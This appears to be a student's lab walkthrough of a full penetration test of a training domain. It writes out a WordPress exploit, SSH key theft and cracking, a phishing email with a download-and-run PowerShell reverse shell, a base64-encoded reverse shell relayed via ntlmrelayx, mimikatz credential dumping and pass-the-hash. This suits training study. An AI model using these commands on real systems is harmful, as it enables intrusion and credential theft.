Assembling the pieces:
192.168.203.244, 192.168.203.242  \\IP's to Enumarate

Step 1: Information Gathering
Do Nmap on both targets:
nmap -sC -sV 192.168.203.244 
nmap -sC -sV 192.168.203.242

Based on Nmap results, look for any vulnerability by using searchsploit, google with context of services that are running in the hosts
There is no pontential attck vector on .242

Identify what technology has been used in the website
 
Use WhatWeb:
whatweb http://192.168.203.244  \\provide more information about the technology stack in use
we can identify they using Word Press

Use WpScan on target .244
wpscan --url http://192.168.203.244 --enumerate p --plugins-detection aggressive   \\will search for any potential vulnerability
After analyzing Wpscan results, found many plungins are outdated. so searched for known exploits for those plugins using searchsploit and google
Found there is an exploit for duplicator plugin in searchsploit
Now gonna use that exploit

Step 2: Atckking the Vulnerable Ip with known info and exploit
Using the exploit "Wordpress Plugin Duplicator 1.3.26"
Examine the code to know the usage 

python3 50420.py http://192.168.50.244 /etc/passwd  \\usage of the exploit to querry the results of /etc/passwd
Found two user:
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash

try to read /etc/shadow file: 
python3 50420.py http://192.168.50.244 /etc/shadow
Tried but no luck, we don't have permissions to read that file

Try to steal id_rsa using the exploit:
python3 50420.py http://192.168.202.244 /home/daniela/.ssh/id_rsa   \\ try id_ecdsa instead id_rsa, if doesn't work
Tried on both usert, got daniela id_rsa

Save the id_rsa in a file and try to login via ssh
change permissions to the file:
chmod 600 id_rsa  \\command to do so
ssh -i id_rsa daniela@192.168.203.244  \\attempt to login via ssh
It is asking for passpharse

Find the Passpharese of id_rsa using John:
ssh2john id_rsa > ssh.hash  \\convert to john format
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash  \\run the command to get find passpharse
Found:tequieromucho

Use the found passpharse to login via ssh:
ssh -i id_rsa daniela@192.168.203.244
Got the access to daniela at 192.168.203.244 (WEBSRV1)

Step 3: After Intial Foothold:
Enumarate the current machine as user Daniela, try to escalate your privilage

To make our enumaration process faster will use linpeas.sh to automate the enum:
python3 -m http.server 80  \\start a python server to deliver the file
wget http://192.168.45.216/linpeas.sh  \\Tranfer the linpeas.sh from our kali to daniela
chmod a+x ./linpeas.sh  \\change permissions to execute
./linpeas.sh  \\execute

After ana.lyzing the output, can found vulnerable vector to privescl
sudo -l   \\check your sudo permissions to exploit the privilages
Found git can run as sudo without password
sudo git -p help config
!/bin/sh  \\Got root access

We can run crackmapexe with found creds:
As of now we have this creds below:
Users & Passwords:
marcus  
john    dqsTwTpZPn#nL
daniela tequieromucho
Passwords:
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL

Will try this on host 192.168.203.242 using crakmapexe:
crackmapexec smb 192.168.203.242 -u usernames.txt -p passwords.txt --continue-on-success
We Found: SMB         192.168.203.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL   \\found valid creds with domain the user associated with
Lets check whether he has access to shares
crackmapexec smb 192.168.203.242 -u john -p "dqsTwTpZPn#nL" --shares
No luck, he doesn't have access to any exclusive shares

As of now we don't have further movement, so will do this with what we have now

Step 4: Further Enumaration to get access to AD domain as user
Sending phishing email to the other users:
we know daniela and marcus are the employees, so we can send them phishing email to them to get reverse shell

Set up things to send phishing email:
Host a webserver using wsgidav:
/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/Programs/webdav

have to create a Windows Library and shortcut file
Config File code:
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.216</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription> 

Save as config.Library-ms  \\this config file will access /root/Program/webdav that we host using WSGIDAV
Then create shortcut with this powershell onliner:
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.216:8000/powercat.ps1'); powercat -c 192.168.45.216 -p 4444 -e powershell"
Then put the shortcut file to config.Library-ms

Now Import powercat.ps1 to current directory:
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
And run python web server on 8000
python3 -m http.server 8000
nc -nvlp 4444  \\listen on nc to catch reverse shell

Then Create a body.txt file and paste this content:
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John

Then Move the config.Library-ms file to current directory and send an email
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.203.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
promt for password and username
Username: john
Password: dqsTwTpZPn#nL
Email will be sent wait for catch reverse shell, the simulated user marcus will give the revershell by opening the config file

Now we get into the AD domain as a marcus User on CLIENTWK1

Step 5: Now Enumarate AD and Get access to Domain Controller:
Got Username and password for marcus
$username = "marcus"
$password = "DefrostNewsySupply5544"

Use winPeas to automate the enumeration Process, transfer the WinPeas.exe to the marcus system:
iwr -uri http://192.168.45.216:8000/winPEASx64.exe -Outfile winPEAS.exe
We found two new ips's and its hostname in the AD
DCSRV1.beyond.com       172.16.158.240
mailsrv1.beyond.com     172.16.158.254
internalsrv1.beyond.com 172.16.158.241

Then there is no other pontential attack vector,so will try with SharpHound and neo4j Bloodhound
iwr -uri http://192.168.45.216:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Then tranfer the output zip file of sharphound findings to our kali

Moving zip file to our kali:
Im going to create a folder and name it "shared" on WINPREP remote host and set it porperty to allow all to access the folder remotely
Create a folder -> got to properties of the folder -> select share then advanced share -> then check the box share the folder -> then click the permission and sell everyone to access
net use Z: \\192.168.202.250\shared /user:offsec lab   \\run this in windows machine as user marcus weher the zip file is located
Copy-Item -Path "C:\Users\marcus\20240504001736_BloodHound.zip" -Destination "Z:\"   \\command to copy the zip file to WINPREP shared folder
Then we can move that file to config folder and access it via webdav folder  \\to do this wsgidav has to be running on webdav to access it via config folder in WINPREP

Step 6: Analyze the zip file Using bloodhound
neo4j start  \\start the neo4j service 
bloodhound  \\run this to open bloodhound and enter neo4j creds
upload the zip file 
and start analyze
use the default querry and also can use manula query:
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p  \\querry to se which user has session on which computer
MATCH (m:Computer) RETURN m  \\just to list the hosts on the AD
MATCH (m:user) RETURN m  \\list users on the AD
upon analyzing the zip file we came to know about some informations

Moving further with the information we got

Step 7: Have create a metapreter session 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe  \\generate a payload and send it to marcus

start a metasploit multi handler session:
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.163
set LPORT 443
set ExitOnSession false   \\ It specifies that the listener stays active for new sessions without the need to restart it for every incoming session
run -j

iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe  \\send met.exe to marcus 
./met.exe  \\execute it
And metapreter will cath the reverse shell

Once session 1 is opened, we can use multi/manage/autoroute and auxiliary/server/socks_proxy to create a SOCKS5 proxy to access the internal network from our Kali box as we learned in the "The Metasploit Framework" Module.
use multi/manage/autoroute
set session 1
run
[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.

Aternate method:
Try using a one-liner for socks5 proxy and generating a reverse shell.
msfconsole -q -x "load auto_add_route; 
use socks_proxy;
run -j;
use payload/windows/x64/meterpreter/reverse_tcp;
set LHOST tun0; 
set LPORT 443; 
generate -f exe -o met.exe; to_handler". 
Execute the generated binary in the target machine 
Add socks5 127.0.0.1 1080 to your /etc/proxychains 

Now set Socks proxy:
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
Now socks proxy is active

Now Just edit the /etc/proxychains4.conf file 
add socks5  127.0.0.1 1080 at the end 

Step 8:
Now we can run crackmapexe and Nmap in internal network:
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares  \\change internal network address accordingly
no luck running this because john don't have access to any shares 
will run nmap to see open ports 
proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254  \\will look for important ports
Nmap identified the open ports 80 and 443 on 172.16.6.241 (INTERNALSRV1) and port 80 on 172.16.6.254 (MAILSRV1)

Now use "curl https://i.jpillora.com/chisel! | bash" to download and install chisel fro better proxy connection
./chisel server -p 8080 --reverse  \\run chisel as a server on kali and added --reverse to do reverse port forwarding
upload /root/Programs/chisel.exe C:\\Users\\marcus\\chisel.exe   \\tansfer chisel.exe to marcus and run chisel there for marcus to act as a client
ON THIS POIN OF TIME DON'T FORGET TO STOP THE WSGISAV which is RUNNING ON PORT 80
chisel.exe client 192.168.45.163:8080 R:80:172.16.158.241:80   \\run this in metapreter shell of marcus
Most Importantly the chisel versions shoud be same for both linux and windows executables
Now we can run the internalsrv1.beyond.com on our broweser

Step 9: Now Enumerate the internalsrv1.beyond.com host
Once we browese to 127.0.0.1:80 (172.16.158.240) it landed on a wordpress built webpage
Don't forget to change /etc/hosts file as 127.0.0.1  internalsrv1.beyond.com, because website will through a error when it direct to wp-admin page
So tried to access admin page 127.0.0.1/wordpress/wp-admin
It landed on a admin login page
Since daniela is kerberoastable, we can attempt to retrieve the user's password this way. If we can crack the TGS-REP1 password hash

proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.158.240 beyond.com/john  \\to get TGS hash of user
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force   \\Got TGS hash, and cracked using hashcat
UserNmae: daniela
Password: DANIelaRO123
Now will login using this creds
And got access to admins dashbord of the Wordpress built website internalsrv1.beyond.com

After analyzing the webpage, we have two possible attack vector, one is we can upload a malicious plugin and activate it to get web shell or a reverse shell
Second option is to force authentication on MailSRV01 because as we know beccy a domain admin has a session on MAILSRV01
So we can go and catch the NTLM hash of Beccy via either way
Will choose Second way, will do force auth, because mostly local admins have same passwords on all domains

Step 10: Force authentication on MAILSRV01 
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.202.242 -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
The above command will force the authentication to MAILSRV01 with creds of INTERSRV and the base64 encode is powershell onliner with 1234 as LPORT
nc -nvlp 1234  \\linten on netcat to cath reverse shell of the MAILSRV01

Now we have to modify the backup migration path to our kali 
//192.168.45.163/test   \\modify and save this path as backup path this will force auth MAILSRV01
If the local admin password is same we will get revershell
we got reverse shell

STEP 10: GET NTLM hash of Beccy using mimikatz as a Privilaged user in MAILSRV1
Now to get a interactive shell to run mimikatz, tranfer the met.exe to the administartor and execute it to open a session on metapreter
iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
./met.exe
a new session will be created on meterpreter
Then open the created session on meterpreter and and tranfer mimikatz.exe
iwr -uri http://192.168.45.163:8000/met.exe -Outfile mimikatz.exe
./mimikatz.exe   \\execute it
privilege::debug
sekurlsa::logonpasswords
Then get NTLM hash of beccy
If it dosen't return any thing then there might be version problem so we can use METERPRETER KIWI
load kiwi  \\run this in meterpreter session
creds_msv  \\then run this, it will give us NTLM hashes

Step 11:Now the Final Part
Using the NTLM hash of Beccy try psexec to login into DCSRV1
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.158.240  \\run this in kali
Then will get into the DCSRV1 as beccy
Now tranfer met.exe and execute it and get sesiion on meterpreter
Open the newly created DCSRV session in meterpreter
Agin tranfer mimikatz to the DCSRV and run, get the NTLM hash of the ADMINISTRATOR

Target Achived....!
Nithesh D
04/05/2024


